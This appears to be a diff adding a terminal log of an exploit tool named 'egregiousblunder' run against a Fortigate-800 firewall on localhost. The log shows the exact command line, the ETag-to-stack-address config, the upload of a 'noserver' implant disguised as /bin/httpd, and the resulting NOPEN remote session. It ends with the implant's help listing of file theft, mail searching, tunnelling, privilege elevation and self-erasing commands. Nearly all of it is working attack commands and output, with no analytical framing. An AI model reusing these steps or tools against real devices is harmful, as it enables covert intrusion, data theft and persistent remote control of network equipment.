@@ -1,0 +1,176 @@
+# cat EGBL_AND_BLATSTING.txt
+
+# pwd
+/current/bin
+
+# curl --insecure --head https://127.0.0.1 | grep ETag
+ETag: "63e_4f_4683142d"
+
+# grep 4683142d ./EGBL.config
+ETAG = 4683142d : 0xbffff4a8 : 800 : 3 : 0559 # BLATSTING
+
+# LD_LIBRARY_PATH=/current/bin/lib ./egregiousblunder_3.0.0.1 -t 127.0.0.1 -p 443 -l 1234 --ssl 1 -v --config ./EGBL.config --etag 4683142d --nopen
+EGBL vers 3.0.0.1
+current options:
+  target IP: 127.0.0.1
+  target port: 443 (SSL on)
+  config file: ./EGBL.config (vers 3.0.0.1)
+  etag: 4683142d (index 326)
+  hardware = 800, firmware = 0559 (gen 3): etag = 4683142d
+  using firmware generation 3
+  source port: 1234
+  install NOPEN
+    noserver file to upload: /current/up/morerats/staticrats/noserver-3.3.0.1-linux-i386-static
+    noclient local executable: /current/bin/noclient
+    loading noserver on target as /bin/httpd, process to run as name /bin/httpsd
+  verbose: 1
+  debug: 0
+
+loading nopen over HTTPS
+prepping to send file /current/up/morerats/staticrats/noserver-3.3.0.1-linux-i386-static of size 356996
+using stack addr 0xbffff4a8
+received good ACK1 message c0edbabe
+received stack addr 0xbffff4a8
+sent the file len/header, next is the file
+..................................
+done with sending (356996 bytes), waiting for file ack
+received good ACK2 message 356996, upload is cool
+got file ack, file size 356996 uploaded
+invoking /current/bin/noclient -i 4 to take over
+
+NOPEN!                             v3.0.5.3
+
+Wed Aug 17 12:29:28 GMT 2016
+NHOME: environment variable not set, assuming "NHOME=/current/bin/.."
+NHOME=/current/bin/..
+TERM=xterm-256color
+Initiating RSA key exchange
+  Generating random number... ok
+  Initializing RC6... ok
+  Sending random number... ok
+  Receiving random number... ok
+  Generating session key... 0xDD5A18A835851B4B1549DB3B984EBDE7
+  Sending first verify string... ok
+  Receiving second verify string... ok
+  Checking second verify string... ok
+RSA key exchange complete
+NOPEN server version... 3.0.5.3
+
+Connection
+  Bytes In / Out     197/82 (240%C) / 63/4 (1575%C)
+  Local Host:Port    localhost:1234 (127.0.0.1:1234)
+  Remote Host:Port   (null):0 (:0)
+  Remote Host:Port   Fortigate-800:443 (127.0.0.1:443)
+Local
+  NOPEN client       3.0.5.3
+  Date/Time          Wed Aug 17 12:29:29 UTC 2016
+  History
+  Command Out
+  CWD                /current/bin
+  NHOME              /current/bin/..
+  PID (PPID)         1749 (1748)
+Remote
+  NOPEN server       3.0.5.3
+  WDIR               NOT SET
+  OS                 Linux 2.4.25 #2 Wed Jun 27 21:28:31 EDT 2007 i686
+  CWD                /
+  PID (PPID)         5139 (34)
+
+Creating history file "/current/bin/../down/history/Fortigate-800.127.0.0.1"... ok
+Creating command output file "/current/bin/../down/cmdout/Fortigate-800.127.0.0.1-2016-08-17-12:29:30"... ok
+
+Lonely?  Bored?  Need advice?  Maybe "-help" will show you the way.
+
+We are starting up our virtual autoport
+We are bound and ready to go on port 1025
+NO! Fortigate-800:/>-help
+[08-17-16 12:29:49 GMT][localhost:1234 -> Fortigate-800.127.0.0.1:443]
+[-help]
+
+Remote General Commands:
+Usage: -elevate
+Usage: -getenv
+Usage: -gs category|filename [options-if-any]
+Usage: -setenv VAR=[val]
+Usage: -shell
+Usage: -status
+Usage: -time
+
+Remote Server Commands:
+Usage: -burn
+Usage: -call ip port
+Usage: -listen port
+Usage: -pid
+
+Remote Network Commands:
+Usage: -icmptime target_ip [source_ip]
+Usage: -ifconfig
+Usage: -nslookup name1 ...
+Usage: -ping -r remote_target_ip [-l local_source_ip] [-i|-u|-t] [-p dest_port] [-s src_port]
+       -ping host
+       -ping [-u|-t|-i] host
+Usage: -trace -r remote_target_ip [-l local_source_ip] [-i|-u|-t] [-p dest_port] [-s src_port]
+       -trace host
+       -trace [-u|-t|-i] host
+
+Remote Redirection Commands:
+Usage: -fixudp port
+Usage: -irtun target_ip call_back_port [call_back_ip] [ourtn arguements]
+Usage: -jackpop target_ip target_port source_ip source_port
+Usage: -nrtun port [toip [toport]]
+Usage: -nstun toip [toport [localport [srcport [command]]]]
+       -nstun toip:port
+Usage: -rawsend tcp_port
+Usage: -rtun port [toip [toport]]
+Usage: -scan
+Usage: -sentry target_address source_address (tcp|udp) dest_port src_port interface
+Usage: -stun toip toport [localport [srcport]]
+Usage: -sutun [-t ttl] toip toport [localport [srcport]]
+Usage: -tunnel [command_listen_port [udp]]
+Usage: -vscan  (should add help)
+
+Remote File Commands:
+Usage: -cat remfile
+Usage: -chili [-l] [-s lines] [-m max] MM-DD-YYYY remdir remfile [remfile ...]
+Usage: -cksum remfile ...
+Usage: -fget [MM-DD-YYYY] loclist
+Usage: -get [-l] [-q] [-s minimumsize] [-m MM-DD-YYYY] remfile ...
+Usage: -grep [-d] [-v] [-n] [-i] [-h] [-C number_of_context_lines] pattern file1 [file2 ...]
+Usage: -oget [-a] [-q] [-s begoff] [-b begoff] [-e endoff] remfile
+Usage: -put locfile remfile [mode]
+Usage: -strings remfile
+Usage: -tail [+/-n] remfile, + to skip n lines of remfile beginning
+Usage: -touch [-t mtime:atime | refremfile] remfile
+Usage: -rm remfile|remdir ...
+Usage: -upload file port
+Usage: -mailgrep [-l] [-m maxbytes] [-r "regexp" [-v]] [-f regexpfilename [-v]] [-a "regexp for attachments to eliminate"] [-b MM-DD-YYYY] [-e MM-DD-YYYY] [-d remotedumpfile] remotedir file1 [file2 ...]
+ ex: -mailgrep -a ".doc" -r "^Fred" -b 2-28-2002 /var/spool/mail G*
+
+Remote Directory Commands:
+Usage: -find [-M | -m -mkfindsargs] [-x[m|a|c] MM-DD-YYYY] remdir [remdir...]
+Usage: -ls [-1ihuRt] [-x[m|a|c] MM-DD-YYYY] [remfile|remdir ...]
+Usage: -cd [remdir]
+Usage: -cdp
+
+Local Client Commands:
+Usage: -autopilot port [xml]
+Usage: -cmdout [locfilename]
+Usage: -exit
+Usage: -help
+Usage: -hist
+Usage: -readrc [locfile]
+Usage: -remark [comment]
+Usage: -rem [comment]
+Usage: # [comment]
+Usage: -reset
+
+Local Environment Commands:
+Usage: -lcd locdir
+Usage: -lgetenv
+Usage: -lpwd
+Usage: -lsetenv VAR=[val]
+Usage: -lsh [[-q] command]
+
+Aliases:
+
+NO! Fortigate-800:/>
